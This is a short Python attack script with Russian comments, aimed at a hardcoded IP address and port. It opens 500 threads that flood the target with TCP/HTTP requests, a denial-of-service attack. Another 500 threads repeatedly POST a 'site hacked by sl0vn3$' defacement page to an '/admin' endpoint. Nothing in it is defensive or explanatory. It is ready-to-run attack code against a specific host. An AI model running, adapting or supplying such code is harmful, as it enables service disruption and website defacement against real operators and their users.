import socket
import threading
import requests

TARGET_IP = "162.159.135.232"
TARGET_PORT = 6463
HTML_PAYLOAD = """<!DOCTYPE html><html><!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Взломан</title>
    <style>
        body {
            background-color: #000000;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .hacked-message {
            font-size: 2.5em;
            text-shadow: 0 0 10px #ff0000;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="hacked-message">
        САЙТ ВЗЛОМАН<br>
        КОМАНДОЙ "sl0vn3$"<br>
        <span style="font-size: 0.6em;">мы контролируем эту систему</span>
    </div>
</body>
</html></html>"""  # Вставь свой HTML

def ddos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendto(f"GET / HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode(), (TARGET_IP, TARGET_PORT))
            s.close()
        except:
            pass

def inject_html():
    while True:
        try:
            requests.post(f"http://{TARGET_IP}/admin", data={"content": HTML_PAYLOAD})  # Уязвимость нужна!
        except:
            pass

for _ in range(500):  # 500 потоков
    threading.Thread(target=ddos_attack).start()
    threading.Thread(target=inject_html).start()
